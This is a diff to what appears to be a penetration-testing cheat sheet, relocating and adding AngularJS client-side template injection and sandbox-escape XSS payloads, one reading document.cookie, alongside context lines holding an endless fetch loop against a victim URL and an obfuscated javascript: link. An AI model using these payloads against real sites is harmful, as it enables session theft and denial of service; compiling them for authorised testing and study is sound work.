@@ -2905,8 +2905,6 @@ Manually testing for XXE vulnerabilities generally involves
   - `onpointerrawupdate` (Chrome only)
   - `onmouseleave`
 - Can't use `alert`, `confirm` or `prompt`? Try `print()`! [[Reference](https://portswigger.net/research/alert-is-dead-long-live-print)]
-- AngularJS
-  - `{{$on.constructor('alert(1)')()}}`
 - This lead the page to make a loop of requests, eventually causing being blocked by a WAF and being a potential DoS
   ```JavaScript
   for(;;){fetch('https://VICTIM/',{method:'GET'});}
@@ -2922,6 +2920,10 @@ Manually testing for XXE vulnerabilities generally involves
   ```HTML
   <a href=jav%26%23x61%3bscript:alert()>
   ```
+- AngularJS
+  - `{{$on.constructor('alert(1)')()}}`
+  - [AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings): `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+  - [AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp): `<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
 - Steal values from inputs
   ```HTML
   <input name=username id=username>
